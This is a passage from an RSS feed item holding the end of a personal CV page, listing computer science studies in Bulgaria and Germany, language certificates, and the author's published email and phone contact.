&lt;li>&lt;a href="https://www.bfu.bg/bg">&lt;strong>Burgas Free University&lt;/strong>&lt;/a> (Computer Science - Masters) - Bulgaria &amp;gt; 2020 - 2021 | Dropped&lt;/li>
&lt;li>&lt;a href="https://www.tu-chemnitz.de/index.html.en">&lt;strong>TU Chemnitz&lt;/strong>&lt;/a> (Software Engineering - Masters) - Germany &amp;gt; 2018 - 2019&lt;/li>
&lt;li>&lt;a href="https://www.bfu.bg/bg">&lt;strong>Burgas Free University&lt;/strong>&lt;/a> (Computer Science - Bachelor) - Bulgaria &amp;gt; 2015 - 2019&lt;/li>
&lt;/ul>
&lt;h1 id="certificates--languages" >&lt;strong>Certificates / Languages&lt;/strong>
&lt;span>
&lt;a href="#certificates--languages">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;ul>
&lt;li>English CERF - C1&lt;/li>
&lt;li>German - Deutsch für die technischen Fächer - B2/B1&lt;/li>
&lt;li>Udemy [UC-CY7BEGYO, UC-0WC1CNGU]&lt;/li>
&lt;/ul>
&lt;h1 id="contact" >&lt;strong>Contact&lt;/strong>
&lt;span>
&lt;a href="#contact">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>You can reach me on my e-mail: &lt;a href="mailto:dganev@pm.me">dganev@pm.me&lt;/a> or by a phone +(359) 88 976 1722&lt;/p></description></item></channel></rss>